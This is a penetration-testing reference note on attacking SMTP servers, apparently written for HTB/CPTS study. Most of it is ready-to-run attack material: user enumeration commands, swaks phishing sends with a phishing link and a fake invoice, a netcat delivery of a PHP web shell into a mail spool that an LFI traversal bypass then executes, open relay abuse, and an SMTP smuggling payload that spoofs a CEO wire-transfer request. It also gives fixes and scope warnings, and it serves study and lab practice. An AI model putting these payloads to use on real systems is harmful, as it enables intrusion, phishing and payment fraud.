# SMTP

#SMTP #SimpleMailTransferProtocol #email #LFI #RCE #MailSpool #SMTPSmuggling #OpenRelay #Phishing

## What is SMTP?
Simple Mail Transfer Protocol — used to send email between mail servers and from clients to servers. Plaintext by default; STARTTLS or SMTPS add encryption.

- Port **TCP 25** — server-to-server (MTA), often blocked on consumer ISPs
- Port **TCP 587** — authenticated client submission (STARTTLS)
- Port **TCP 465** — SMTPS (SSL/TLS wrapped, older standard)
- MUAs (mail clients) use 587; MTAs relay on 25
- Can be used for user enumeration and phishing/relay abuse

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Scanning/NMAP\|Nmap]] | Port/version detection + `smtp-commands`, `smtp-enum-users`, `smtp-open-relay`, `smtp-ntlm-info` NSE scripts |
| [[Tools/Recon/smtp-user-enum\|smtp-user-enum]] | Automated `VRFY` / `EXPN` / `RCPT TO` user enumeration |
| [[Tools/Email/swaks\|swaks]] | Scriptable SMTP client — send test/phishing mail, auth, attachments, spool payloads |
| [[Tools/Auth/o365spray\|o365spray]] | User enumeration and password spraying against Office 365 / Exchange Online |
| [[Tools/Remote Access/telnet\|telnet]] | Manual protocol interaction — banner grab, `VRFY`, NTLM challenge |
| [[Tools/Remote Access/Netcat\|Netcat]] | Raw socket for banner grabbing and mail-spool payload delivery |
| [[Tools/Web/openssl\|openssl]] | `s_client` for STARTTLS / SMTPS connections |
| [[Tools/Payloads & Shells/metasploit\|Metasploit]] | `auxiliary/scanner/smtp/smtp_enum` and related modules |

---

## SMTP Commands

| Command | Description |
|---|---|
| `HELO <hostname>` | Identify client to server (basic) |
| `EHLO <hostname>` | Extended HELLO — list supported extensions |
| `AUTH PLAIN` | Authenticate client (base64 encoded) |
| `MAIL FROM:<addr>` | Specify sender |
| `RCPT TO:<addr>` | Specify recipient |
| `DATA` | Begin message body (end with `.` on its own line) |
| `VRFY <user>` | Check if mailbox exists (often disabled) |
| `EXPN <list>` | Expand mailing list to member addresses |
| `RSET` | Abort current transmission, keep connection |
| `NOOP` | Keep-alive / check connection |
| `QUIT` | End session |

---

## Enumeration

### Banner Grab

```bash
nc -nv <target> 25
telnet <target> 25
```

### User Enumeration via VRFY

```bash
telnet 10.10.110.20 25
EHLO test
VRFY root
# 252 = exists, 550 = doesn't exist
```

### User Enumeration via EXPN

```bash
EXPN john
# 250 = exists + shows real address
EXPN support-team
# may expand a list to multiple addresses
```

### User Enumeration via RCPT TO

```bash
MAIL FROM:test@test.com
RCPT TO:john
# 250 = exists, 550 = unknown user
```

### Automated User Enumeration

```bash
# smtp-user-enum
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t <target>
smtp-user-enum -M RCPT -U users.txt -D domain.com -t <target>

# o365spray (Office 365)
python3 o365spray.py --enum -U users.txt --domain target.com

# Metasploit
use auxiliary/scanner/smtp/smtp_enum
```

### NMAP

```bash
nmap -p 25,465,587 --script smtp-commands,smtp-enum-users,smtp-open-relay -sV <target>

# NTLM info disclosure — leaks domain name, hostname, DNS info from NTLM challenge
nmap -p 25 --script smtp-ntlm-info --script-args smtp-ntlm-info.domain=domain.com <target>
```

### NTLM Auth Info Disclosure

When a server supports NTLM authentication, it discloses internal info without credentials.

```bash
# Manual — trigger NTLM challenge via AUTH NTLM
telnet <target> 25
EHLO test
AUTH NTLM
TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
# Server returns base64 NTLM challenge — decode to reveal:
# - NetBIOS domain name
# - NetBIOS computer name
# - DNS domain name
# - DNS hostname

# Decode NTLM challenge
echo "TlRMTVNTUAAC..." | base64 -d | strings
```

---

## Connect / Access

```bash
# Plaintext — banner + capability list
nc -nv <target> 25
telnet <target> 25
EHLO test            # lists supported extensions (AUTH mechanisms, STARTTLS, SIZE, PIPELINING…)
```

### TLS / STARTTLS

```bash
# STARTTLS upgrade (submission + MTA ports)
openssl s_client -starttls smtp -connect <target>:587
openssl s_client -starttls smtp -connect <target>:25

# Direct TLS (SMTPS)
openssl s_client -connect <target>:465
```

### Authenticated Submission

```bash
# Base64-encode creds for AUTH PLAIN / AUTH LOGIN
printf '\0user@domain.com\0Password123' | base64     # AUTH PLAIN
echo -n 'user@domain.com' | base64                    # AUTH LOGIN (user, then pass, separately)
```

---

## Attack Vectors

### Phishing / Arbitrary Mail Send (swaks)

```bash
# Basic send (test relay / phishing)
swaks --from notifications@inlanefreight.com \
      --to employees@inlanefreight.com \
      --header 'Subject: Company Notification' \
      --body 'Click here: http://phishing.com/' \
      --server 10.10.11.213

# With auth
swaks --from attacker@domain.com \
      --to target@domain.com \
      --server mail.target.com \
      --port 587 \
      --auth LOGIN \
      --auth-user user@domain.com \
      --auth-password 'Password123' \
      --tls \
      --header 'Subject: Test' \
      --body 'Body text'

# With attachment
swaks --to target@domain.com \
      --from attacker@domain.com \
      --server 10.10.110.20 \
      --attach @/path/to/file.pdf \
      --header 'Subject: Invoice'
```

---

### Mail Spool Poisoning → LFI = RCE

When a box exposes **both** an SMTP server (port 25) **and** a PHP LFI, chain them for a foothold. Local MTAs (Postfix/Sendmail/exim) deliver mail addressed to a **local system user** into that user's **mail spool** — an mbox file at `/var/mail/<user>` (a.k.a. `/var/spool/mail/<user>`). The message body is written to disk **verbatim**, so if the body is PHP and you then `include()` the spool via the LFI, PHP executes it. This is the *Trick* (HTB) foothold.

> [!tip] The recipient is a **local username**, not an email address. `RCPT TO: michael` delivers to `/var/mail/michael` — no domain, no real mailbox needed. Pick a user you've enumerated (from `/etc/passwd` via the LFI, from SMTP `VRFY`/`RCPT` enum above, etc.).

### 1. Deliver the PHP payload with netcat

```bash
nc <target> 25
HELO x
MAIL FROM: attacker@evil.com
RCPT TO: michael
DATA
<?php system($_GET['cmd']); ?>
.
QUIT
```

Line-by-line: `HELO x` greets the server; `MAIL FROM:` sets the (arbitrary) sender; `RCPT TO:` names the **local recipient**; `DATA` begins the body; a lone `.` on its own line — the `<CR><LF>.<CR><LF>` terminator — ends the message and queues it for delivery.

> [!note] swaks scripts the same thing: `swaks --server <target> --from a@b.c --to michael --header 'Subject: x' --body '<?php system($_GET["cmd"]); ?>'`. Netcat is shown because it's always present and makes the raw protocol obvious.

### 2. Include the spool file via the LFI

```bash
# Your PHP now sits in michael's spool — include it to execute
curl "http://<target>/index.php?page=/var/mail/michael&cmd=id"

# If the app strips '../' non-recursively (e.g. str_replace("../","",$page)),
# double the traversal so one pass leaves a valid '../':
curl "http://<target>/index.php?page=....//....//....//....//var/mail/michael&cmd=id"
```

**Spool locations to try:** `/var/mail/<user>`, `/var/spool/mail/<user>`.

> [!warning] The mbox file accumulates **every** delivered message plus mbox headers (`From `, `Return-Path:`, etc.). If earlier junk breaks parsing, PHP may fatal before reaching your `<?php`; re-send to a fresh user, or send your payload as the newest message and rely on PHP tolerating the leading noise.

Full LFI mechanics (this and log-poisoning/session/`/proc/self/fd` variants): [[Class notes/HTB Academy/CPTS v2 (claude)/File Inclusion|File Inclusion]]. Contrast with **mail-*log*** poisoning (`/var/log/mail.log`), which injects into a log rather than delivering a verbatim message body.

---

### Open Relay Abuse

```bash
# Test if server will relay for external domains
nmap -p 25 --script smtp-open-relay -v <target>

# Manual test
telnet <target> 25
EHLO test
MAIL FROM:<external@gmail.com>
RCPT TO:<target@gmail.com>  # if 250, it's an open relay
DATA
.
QUIT
```

### SMTP Smuggling (CVE-2023-51764 / 51765 / 51766)

Disclosed at **37C3 (Dec 2023)**. Outbound and inbound servers disagree on what terminates the `DATA` block: the spec says `<CR><LF>.<CR><LF>`, but some MTAs also accept broken variants like `<LF>.<CR><LF>` or `<CR>.<CR>`. Smuggle one of those inside a message body and the **receiving** server sees the tail as a *second, separate email* — one that was relayed by a legitimate, SPF/DKIM/DMARC-passing server. Result: **spoofed mail from any domain that clears authentication checks**.

| CVE | MTA |
|---|---|
| CVE-2023-51764 | Postfix (≤ 3.8.5) |
| CVE-2023-51765 | Sendmail |
| CVE-2023-51766 | Exim |

```bash
# Structure of the smuggled payload — the inner message is what the receiver delivers
MAIL FROM:<attacker@attacker.com>
RCPT TO:<victim@target.com>
DATA
Subject: benign wrapper

<LF>.<CR><LF>          # premature terminator the OUTBOUND server ignores
MAIL FROM:<ceo@target.com>    # ...but the INBOUND server treats as a new transaction
RCPT TO:<victim@target.com>
DATA
Subject: Urgent wire transfer
Spoofed body — passes SPF because the relay is legitimate.
.
QUIT
```

```bash
# PoC (Expect script)
git clone https://github.com/duy-31/CVE-2023-51764 && cd CVE-2023-51764
```

> [!warning] This sends real mail through real infrastructure to a real recipient. Only test against domains in scope, and use a mailbox you control as the recipient — a successful PoC is indistinguishable from live BEC/phishing to anyone monitoring the target.

**Fix / detection:** Postfix `smtpd_forbid_bare_newline = yes` (3.9+, backported) plus `smtpd_data_restrictions = reject_unauth_pipelining`. The impact is that SPF/DKIM/DMARC all *pass* on the spoofed message — the smuggled mail really was relayed by the authorized server, so domain-authentication records provide no defence here.

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| Open relay (`mynetworks` too broad) | Spam/phishing vector |
| `VRFY` / `EXPN` enabled | User enumeration |
| Plaintext auth on port 25 | Credential interception |
| No SPF/DKIM/DMARC records | Email spoofing |
| Auth not required for relay | Spam abuse |
| `smtpd_forbid_bare_newline = no` (Postfix < 3.9) | SMTP smuggling — spoofed mail that passes SPF/DKIM/DMARC |
| MTA delivers to local system users | Mail spool poisoning → RCE when chained with an LFI |
| Verbose banner (exact MTA + version) | Version-specific CVE targeting |

---

## Quick Reference

| Goal | Command |
|---|---|
| Banner grab | `nc -nv host 25` |
| User enum (VRFY) | `smtp-user-enum -M VRFY -U users.txt -t host` |
| User enum (RCPT) | `smtp-user-enum -M RCPT -U users.txt -D domain -t host` |
| Send phishing email | `swaks --from x --to y --server host --body 'url'` |
| Open relay check | `nmap -p 25 --script smtp-open-relay host` |
| TLS connect | `openssl s_client -starttls smtp -connect host:587` |
| Nmap enum | `nmap -p 25,587 --script smtp-commands,smtp-enum-users` |
| Mail spool → LFI RCE | `nc host 25` → `RCPT TO: <localuser>` → body `<?php system($_GET['cmd']); ?>` → `?page=/var/mail/<localuser>&cmd=id` |
| SMTP smuggling test | Smuggle `<LF>.<CR><LF>` inside `DATA` → second spoofed message (CVE-2023-51764/5/6) |
| NTLM info leak | `nmap -p 25 --script smtp-ntlm-info host` |

---

*Created: 2026-07-13*
*Updated: 2026-08-13*
*Model: claude-opus-5*
